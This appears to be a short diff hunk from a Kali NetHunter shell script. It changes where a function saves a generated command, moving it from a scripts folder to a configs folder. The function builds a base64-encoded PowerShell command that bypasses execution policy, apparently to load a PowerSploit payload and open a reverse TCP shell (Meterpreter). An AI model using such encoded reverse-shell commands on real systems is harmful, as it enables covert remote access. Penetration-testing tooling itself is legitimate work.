@@ -19,7 +19,7 @@ fi
 f_reverse(){
 encode="`cat /data/local/nhsystem/kali-armhf/var/www/html/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
 command=" PowerShell.exe -Exec ByPass -Nol -Enc $encode"
-echo " $command" >/sdcard/nh_files/scripts/rev-tcp
+echo " $command" >/sdcard/nh_files/configs/rev-tcp
 }
 
 if [ "$1" == "start-rev-met" ]; then
